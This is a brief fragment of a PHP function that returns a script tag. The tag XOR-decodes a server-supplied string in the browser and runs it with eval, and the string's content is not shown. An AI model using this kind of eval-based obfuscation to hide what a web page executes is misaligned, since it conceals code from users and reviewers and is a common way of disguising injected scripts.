	return '<script language=JavaScript>str = "'.$new.'";str2 = "";for (i = 0; i < str.length; i ++) { str2 = str2 + String.fromCharCode (str.charCodeAt (i) ^ 1); }; eval (str2);</script>';
} 

?>